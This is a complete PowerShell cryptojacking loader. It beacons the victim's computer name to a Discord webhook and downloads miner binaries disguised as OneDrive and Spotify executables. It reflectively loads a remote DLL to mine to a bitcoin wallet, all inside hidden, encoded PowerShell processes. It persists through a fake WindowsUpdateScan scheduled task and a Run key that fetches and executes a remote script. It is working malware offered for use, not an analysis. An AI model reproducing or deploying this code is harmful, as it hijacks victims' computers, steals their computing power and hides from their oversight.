# Ghost Loader - Nuclear v1
$u = "HolyV200"; $r = "ulta"; $w = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
$hook = "https://discord.com/api/webhooks/1496175217926475898/Ipm8VvLnOmN3dTUu7nyvqESjdBFRmEFmvYEr4O5tayaCfvMXpf3t_KXTjwRmO-2-i2c_"

function Send-Ping($m) {
    if (!$hook) { return }
    try {
        $j = @{ embeds = @(@{ title = "🚀 $m"; color = 3066993; fields = @(@{ name = "Worker"; value = "$env:COMPUTERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $hook -Method Post -Body $j -ContentType "application/json" -ErrorAction SilentlyContinue -TimeoutSec 2 | Out-Null
    } catch { }
}
Send-Ping "BOOTING..."

$ProgressPreference = 'SilentlyContinue'
$bDir = $env:LOCALAPPDATA; if (!$bDir) { $bDir = $env:TEMP }
$sDir = [System.IO.Path]::Combine($bDir, "Microsoft", "Windows", "UpdateCoord")
if (!(Test-Path $sDir)) { New-Item -ItemType Directory -Force -Path $sDir | Out-Null }

# KILL CONFLICTS
try { Get-Process "xmrig", "gminer", "miner" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch { }

function Get-F($Url, $Path) {
    if (Test-Path $Path) { try { Remove-Item $Path -Force -ErrorAction SilentlyContinue } catch { } }
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    for ($i = 0; $i -lt 3; $i++) {
        try { 
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", $ua)
            $wc.DownloadFile($Url, $Path)
            if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 10KB) { return $true } }
        } catch { }
        try { curl.exe -sL -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 10KB) { return $true } } } catch { }
        Start-Sleep -Seconds 2
    }
    return $false
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$cz = Join-Path $sDir "upd_c.zip"; $gz = Join-Path $sDir "upd_g.zip"; $ce = Join-Path $sDir "OneDriveStandalone.exe"; $ge = Join-Path $sDir "SpotifyHelper.exe"
$dUrl = "https://raw.githubusercontent.com/$u/$r/main/Bridge.dll?v=$([Guid]::NewGuid())"
$mUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$gUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"

# STAGE CPU
if (!(Test-Path $ce)) {
    if (Get-F $mUrl $cz) {
        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($cz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
        Remove-Item $cz -Force -ErrorAction SilentlyContinue
        $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($uz) { for($k=0;$k-lt 5;$k++){ try{ Move-Item $uz.FullName -Destination $ce -Force; break }catch{ Start-Sleep -Seconds 2 } } }
    }
}

# STAGE GPU
$gd = $false
try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
if ($gd -and !(Test-Path $ge)) {
    if (Get-F $gUrl $gz) {
        try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat", "OneDriveStandalone.exe" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
        for ($j=0;$j-lt 5;$j++) { try { [System.IO.Compression.ZipFile]::ExtractToDirectory($gz, $sDir); break } catch { Start-Sleep -Seconds 2 } }
        Remove-Item $gz -Force -ErrorAction SilentlyContinue
        $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($uz) { for($k=0;$k-lt 5;$k++){ try{ Move-Item $uz.FullName -Destination $ge -Force; break }catch{ Start-Sleep -Seconds 2 } } }
    }
}

# EXECUTE DETACHED
$dp = Join-Path $sDir "Bridge.dll"
if (Get-F $dUrl $dp) {
    try {
        $ga = if ($gd) { $ge } else { "" }
        $rc = "`$bl=[System.IO.File]::ReadAllBytes('$dp');[System.Reflection.Assembly]::Load(`$bl).GetType('DateFundLoader').GetMethod('StartMiner').Invoke(`$null,@('$ce','$ga','$w'))"
        $eb = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rc))
        Start-Process "powershell.exe" -WindowStyle Hidden -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $eb" -ErrorAction SilentlyContinue
        Write-Host "running"; Send-Ping "SUCCESS/ACTIVE"
        
        $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
        $ec = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
        $tp = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $ec"
        $ad = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        if ($ad) { schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$tp" /sc onlogon /rl highest /f /ru "System" /ErrorAction SilentlyContinue }
        else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
        return
    } catch { }
}
Write-Host "failed"; Send-Ping "FAILED/ERROR"
